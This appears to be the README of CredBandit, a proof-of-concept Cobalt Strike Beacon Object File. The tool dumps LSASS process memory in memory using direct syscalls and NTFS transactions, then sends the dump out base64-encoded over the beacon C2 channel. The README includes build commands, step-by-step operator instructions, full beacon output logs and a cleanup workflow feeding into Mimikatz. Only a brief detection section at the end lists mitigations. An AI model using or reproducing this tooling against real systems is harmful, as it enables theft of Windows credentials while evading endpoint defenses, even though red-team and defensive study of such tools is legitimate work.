# CredBandit

CredBandit is a proof of concept Beacon Object File (BOF) that uses static x64 syscalls to perform a complete in memory dump of a process and send that back through your already existing Beacon communication channel.  The memory dump is done by using NTFS transactions which allows us to write the dump to memory and the MiniDumpWriteDump API has been replaced with an adaptation of ReactOS's implementation of MiniDumpWriteDump. 

The BOF then encodes the in memory data using base64, chunks it, and then sends the data back through your Cobalt Strike team server. It achieves this via an unconvential way by taking advantage of the BOF BeaconPrintf() function and using an Aggressor script to parse and then write the output to a file inside the cobaltstrike folder on the system where you are running your Cobalt Strike GUI.  This is currently a workaround and hopefully a feature will be added soon that lets operators send arbritrary data back through the beacon.  Till then ¯\\\_(ツ)\_/¯.

The advantage of doing it this way is that the dump is never written to disk and is sent via your already established C2 channel.  The disadvantage is that it is using a function that was clearly never meant to be used to transfer large amounts of data so it's what we jokingly call on our team, duct tape engineering.

I have also left the option for you to dump the base64 memory dump to disk if you choose to do that instead and pull it over using Beacons more stable download option for example.

# Subject References

This tool wouldn't exist without being able to piggyback off some really great research, tools, and code already published by members of the security community. So thank you. Lastly, if you feel anyone has been left out below, please let me know and I will be sure to get them added.

- Red Team Tactics: Combining Direct System Calls and sRDI to bypass AV/EDR (by [@Cneelis](https://twitter.com/Cneelis)) - [here](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)
- Direct Syscalls in Beacon Object Files (by [@Cneelis](https://twitter.com/Cneelis)) - [here](https://outflank.nl/blog/2020/12/26/direct-syscalls-in-beacon-object-files/)
- TransactedSharpMiniDump - [here](https://github.com/PorLaCola25/TransactedSharpMiniDump)
- rookuu/BOFS/MiniDumpWriteDump (by [@rookuu_](https://twitter.com/rookuu_))- [here](https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump) - Did all the heavy lifting for converting the ReactOS minidump.c to BOF compatible code
- SysWhispers (by [@Jackson_T](https://twitter.com/Jackson_T))- [here](https://github.com/jthuraisamy/SysWhispers)
- InlineWhsipers - [here](https://github.com/outflanknl/InlineWhispers)
- ([@ilove2pwn_](https://twitter.com/ilove2pwn_)) - Confirmed my idea of the possibility of being able to use BeaconPrintf() function to send data back through CS, helped me get started with writing/understanding the amazing (insert == sarcasm) sleep language.  I also borrowed and modified little bit of logic for chunking data in C [here](https://gist.github.com/SecIdiot/82e4162e495602f064aba5b42575da5e)

## Getting Started

1. Copy the credBandit folder with all of its contents and place it a directory just above your cobaltstrike folder on whatever system you plan to connect with via the GUI application.
2. Right before you run credBandit, load in the MiniDumpWriteDump.cna Aggressor script
3. Run credBandit against target LSASS process
4. When the memory dump is completed run the cleanupMiniDump.sh script to produce the final .dmp file in the form of YEAR_MONTH_DAY_HOUR_MINUTE_AM/PM.dmp and a backup of the original dumpFile.txt in the form of YEAR_MONTH_DAY_HOUR_MINUTE_AM/PM.txt in case anything goes wrong with the cleanup script.
5. **When the dump completes, unload the MiniDumpWriteDump.cna Aggressor script and load the RevertMiniDumpWriteDump.cna Aggressor script**(Since we are changing how data is being written to the console we need to revert it back to its normal behavior so other tool's output works as expected.  However, if you choose to never use the BeaconPrintf function to send data back, you can modify the MiniDumpWriteDump.cna by just deleting the entire set BEACON_OUTPUT {} block)
6. Use Mimikatz to extract the dump file

### Build Your Own

Run the below command inside the src directory
```
sudo x86_64-w64-mingw32-gcc -o credBanditx64.o -c credBandit.c  -masm=intel
```

### Use Case

> *With Administrator or SYSTEM rights, the operator can perform a memory dump of LSASS without ever touching disk*

### Syntax

1. Perform memory dump and send back through CS using BeaconPrintf function

```
beacon> credBandit 648
[*] Running credBandit by (@anthemtotheego)
[+] host called home, sent: 19049 bytes
[+] received output:
[+] Attempting To Enable Debug Privs

[+] received output:
[+] Attempting To Dump Proccess 648

[+] received output:
[+] NtOpenProcess returned HANDLE 0x0000000000000374

[+] received output:
[+] NtCreateTransaction returned HANDLE 0x00000000000001A0

[+] received output:
[+] RtlSetCurrentTransaction successfully set

[+] received output:
[+] NtCreateFile returned HANDLE 0x00000000000003F0

[+] received output:
[+] RtlSetCurrentTransaction successfully set

[+] received output:
[+] OS Version: 10.0.17763

[+] received output:
[+] MiniDump written to memory

[+] received output:
[+] MiniDump Size In Bytes = 67777472

[+] received output:
[+] NtCreateSection created

[+] received output:
[+] NtMapViewOfSection successful

[+] received output:
[+] Base64 Length In Bytes = 90369964

[+] received output:
[+] Data Exfiltration might Take A Few Minutes So Be Patient...

[+] received output:
[+] Dump completed
```

2. Clean up the dump file to be mimikatz compatible

```
./cleanupMiniDump.sh 
```

### Use Case

> *With Administrator or SYSTEM rights, the operator can perform a memory dump and write the base64 encoded dump to a location of their choosing*

### Syntax

1. Perform memory dump and write base64 encoded memory dump to a location of your choosing on disk

```
beacon> credBandit 620 c:\users\anthem\desktop\myDump.txt
[*] Running credBandit by (@anthemtotheego)
[+] host called home, sent: 19606 bytes
[+] received output:
[+] Attempting To Enable Debug Privs

[+] received output:
[+] Attempting To Dump Proccess 620

[+] received output:
[+] NtOpenProcess returned HANDLE 0x0000000000000590

[+] received output:
[+] NtCreateTransaction returned HANDLE 0x0000000000000598

[+] received output:
[+] RtlSetCurrentTransaction successfully set

[+] received output:
[+] NtCreateFile returned HANDLE 0x000000000000059C

[+] received output:
[+] RtlSetCurrentTransaction successfully set

[+] received output:
[+] OS Version: 10.0.19042

[+] received output:
[+] MiniDump written to memory

[+] received output:
[+] MiniDump Size In Bytes = 78331860

[+] received output:
[+] NtCreateSection created

[+] received output:
[+] NtMapViewOfSection successful

[+] received output:
[+] Base64 Length In Bytes = 104442480

[+] received output:
[+] Writing file was successful

[+] received output:
[+] Dump completed
```

2. Decode the dump file

```
base64 -d myDump.txt > myDump.dmp
```

## Caveats

1. While I have tried to make this pretty stable, I can't guarantee beacon's won't ever crash and this method is 100% stable when using the BeaconPrintf function to send data back.  If this is your one and only beacon, you may want to really think it through before running.
2. Since the BOF is executed in process and takes over the beacon while running, sleep time is not relevant.  Data will be continously sent while dump is exfiltrated.
3. Every once in while due to the last chunk size that is recieved you may see something like this right before your dump completes:

```
[+] received output:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] received output:
[+] Dump completed
```

You can simply fix this by running the following before executing the cleanupMiniDump.sh script

```
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" >> /path/to/dumpFile.txt
```
4. When this is ran it will appear that your beacons are locked up.  This is not the case, it is just busy writing data to the dump file. Once the dumpFile has been finished, beacons will return to showing checkin times and work as normal.
5. Lastly, I commented in the code places where you could make modifications if you wanted to do other stuff, for example, write to disk instead, add in different encoding/encryption, Comms, etc.
 
## Detection

Some detection and mitigation strategies that could be used:

1. Credential Guard [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage)
2. Event Tracing [here](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing)
3. Looking for suspicious processes touching LSASS
4. Looking for other known Cobalt Strike Beacon IOC's or C2 egress/communication IOC's. 
